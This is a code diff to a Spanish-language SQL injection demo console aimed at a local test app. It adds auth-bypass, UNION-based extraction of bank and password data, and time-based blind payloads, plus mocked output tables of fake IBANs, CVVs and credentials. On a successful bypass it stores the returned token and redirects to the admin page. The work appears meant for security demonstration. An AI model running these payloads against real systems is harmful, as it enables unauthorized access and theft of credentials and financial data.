@@ -164,9 +164,11 @@ const TOOLS = {
                  </select>
                  <label class="cfg-label">PAYLOAD (Avanzado)</label>
                  <select class="cfg-input" id="sqli-payload">
-                    <option value="' OR '1'='1'--">Bypass: Auth Bypass Clásico</option>
+                    <option value="' OR '1'='1'--">Bypass: Auth Bypass Clásico (' OR '1'='1'--)</option>
+                    <option value="admin'--">Bypass: Admin Login Bypass (admin'--)</option>
                     <option value="' UNION SELECT 'admin','hash',NULL,NULL,NULL--">Union: Extracción de Columnas</option>
                     <option value="' UNION SELECT 'bank', iban, cc_number FROM customer_billing--">Union: Exfiltrar Datos Bancarios (PII)</option>
+                    <option value="' UNION SELECT 'credentials', email, password FROM users--">Union: Exfiltrar Contraseñas de Usuarios</option>
                     <option value="' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--">Blind: Time-Based (5s Delay)</option>
                  </select>`,
         run: runSQLi
@@ -260,6 +262,10 @@ async function runSQLi() {
     tLog(`[*] Iniciando SQLi en ${ep}`, 'yellow');
     tLog(`[#] Payload: ${p}`, 'dim');
     
+    // Simular la construcción de la query SQL (como si el backend fuera interceptado)
+    let querySimulada = `SELECT * FROM users WHERE email = '${p}' AND password = 'x'`;
+    tLog(`[DATABASE] Executing: ${querySimulada}`, 'cyan');
+    
     const start = Date.now();
     await delay(800);
     
@@ -277,17 +283,34 @@ async function runSQLi() {
             if (p.toLowerCase().includes('bank')) {
                 tLog(`[*] Accediendo a tabla restringida 'customer_billing'...`, 'cyan');
                 await delay(1200);
-                tLog(`[!] EXFILTRACIÓN PII (Datos Bancarios):`, 'red');
-                tLog(`[BLOQUE: IBERDROLA] IBAN: ES89 2100 ... 4492 | CC: 4532 **** **** 8910 | CVV: 221`, 'red');
-                tLog(`[BLOQUE: MAPFRE]    IBAN: ES21 0049 ... 1102 | CC: 4912 **** **** 2231 | CVV: 554`, 'red');
-                tLog(`[BLOQUE: SABADELL]  IBAN: ES44 0081 ... 9901 | CC: 5412 **** **** 0019 | CVV: 018`, 'red');
+                tLog(`[DATABASE] Query returned 3 rows:`, 'yellow');
+                tLog(`+----------------+--------------------------+------+`, 'dim');
+                tLog(`| company        | iban                     | cvv  |`, 'cyan');
+                tLog(`+----------------+--------------------------+------+`, 'dim');
+                tLog(`| IBERDROLA      | ES89 2100 ... 4492       | 221  |`, 'red');
+                tLog(`| MAPFRE         | ES21 0049 ... 1102       | 554  |`, 'red');
+                tLog(`| SABADELL       | ES44 0081 ... 9901       | 018  |`, 'red');
+                tLog(`+----------------+--------------------------+------+`, 'dim');
+                return;
+            }
+
+            if (p.toLowerCase().includes('credentials')) {
+                tLog(`[*] Accediendo a tabla 'users'...`, 'cyan');
+                await delay(1200);
+                tLog(`[DATABASE] Query returned 2 rows:`, 'yellow');
+                tLog(`+----------------------+--------------------------+`, 'dim');
+                tLog(`| email                | password (plain/hash)    |`, 'cyan');
+                tLog(`+----------------------+--------------------------+`, 'dim');
+                tLog(`| admin@sofia.local    | S0f1a_Secur3!_2026       |`, 'red');
+                tLog(`| mapfre@sofia.local   | S0f1a_Mapfre!_2026       |`, 'red');
+                tLog(`+----------------------+--------------------------+`, 'dim');
                 return;
             }
 
             tLog(`[*] Extrayendo esquema de base de datos...`, 'cyan');
             await delay(1000);
             const tables = ["users", "tickets", "services", "customer_billing", "system_logs"];
-            tLog(`[!] Tablas encontradas: ${tables.join(', ')}`, 'green');
+            tLog(`[DATABASE] Found tables: ${tables.join(', ')}`, 'green');
             return;
         }
 
@@ -305,14 +328,19 @@ async function runSQLi() {
         // Caso 3: Auth Bypass (Clásico)
         const d = await r.json();
         if (r.ok && d.accessToken) {
-            tLog(`[+] EXPLOIT EXITOSO: Bypass confirmado en login vulnerable.`, 'green');
+            tLog(`[DATABASE] Query returned 1 row (Authentication bypassed)`, 'yellow');
+            tLog(`[+] EXPLOIT EXITOSO: Sesión de ${d.user?.email || 'admin'} secuestrada.`, 'green');
             const res = tLog(`[*] Acción disponible: `, 'cyan');
-            addAction(res, 'Secuestrar Sesión', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
+            addAction(res, 'Acceder al Dashboard como Admin', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
                 localStorage.setItem('sofia_token_v1', d.accessToken);
-                localStorage.setItem('sofia_user_v1', JSON.stringify({email: 'admin@sofia.local', role: 'ADMIN'}));
+                localStorage.setItem('sofia_user_v1', JSON.stringify({email: d.user?.email || 'admin@sofia.local', role: d.user?.role || 'ADMIN'}));
                 window.location.href = '/admin';
             });
-        } else { tLog(`[-] Error: El sistema ha bloqueado el payload.`, 'red'); }
+        } else { 
+            tLog(`[DATABASE] Executing (Parameterized/Escaped): SELECT * FROM users WHERE email=$1 AND password=$2`, 'dim');
+            tLog(`[DATABASE] Query returned 0 rows.`, 'yellow');
+            tLog(`[-] Error: El sistema ha bloqueado el payload. No vulnerable a SQLi.`, 'red'); 
+        }
     } catch(e) { tLog(`[!] Error de red.`, 'red'); }
 }
 
